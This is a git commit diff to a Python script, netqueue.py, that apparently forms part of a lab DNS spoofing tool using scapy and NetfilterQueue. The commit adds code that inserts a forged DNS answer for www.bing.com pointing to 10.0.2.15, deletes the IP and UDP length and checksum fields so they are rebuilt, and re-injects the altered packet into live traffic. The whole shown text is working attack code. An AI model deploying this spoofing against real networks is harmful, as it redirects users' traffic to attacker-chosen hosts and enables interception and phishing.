0ac0f371c21beef4d3fc91b42dbd54cb2ff22218
root <root@localhost.localdomain>
2018-08-07 05:42:20 -0400

    custom dns response added

--- netqueue.py
+++ netqueue.py
@@ -14,6 +14,16 @@ def process_packet(packet):
         if "www.bing.com" in qname:
             print("[+] Spoofing target")
             answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].len
+            del scapy_packet[scapy.UDP].chksum
+
+            packet.set_payload(str(scapy_packet))
+
     packet.accept()
 
 queue = nfq.NetfilterQueue()
